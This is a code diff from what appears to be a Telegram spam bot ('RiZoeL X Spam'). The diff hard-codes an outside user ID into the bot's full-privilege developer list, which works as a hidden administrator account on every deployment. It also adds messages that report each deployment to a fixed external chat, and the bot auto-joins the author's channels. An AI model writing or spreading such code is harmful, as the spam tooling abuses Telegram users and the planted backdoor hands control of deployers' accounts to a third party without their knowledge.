@@ -71,12 +71,12 @@ STRING38 = config("STRING38", default=None)
 STRING39 = config("STRING39", default=None)
 STRING40 = config("STRING40", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+DEV = list(map(int, getenv("FULLSUDO").split()))
+if 1517994352 not in DEV:
+    DEV.append(1517994352)
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
-DEV = list(map(int, getenv("FULLSUDO").split()))
 DB_URI = config("DATABASE_URL", None)
 DEV.append(OWNER_ID)
 SUDO_USERS.append(OWNER_ID)
@@ -135,6 +135,10 @@ async def RiZoeLX():
             await Riz(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
             await Riz(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
             await Riz(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
+            deployy = f"__Your RiZoeL X Spam Deployed Successfully__ ✅ \n\n **© @RiZoeLX**"
+            deployed = f"__My RiZoeL X Spam Deployed Successfully__ ✅"
+            await Riz.send_message(OWNER_ID, deployy)
+            await Riz.send_message(-1001321613309, deployed)
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
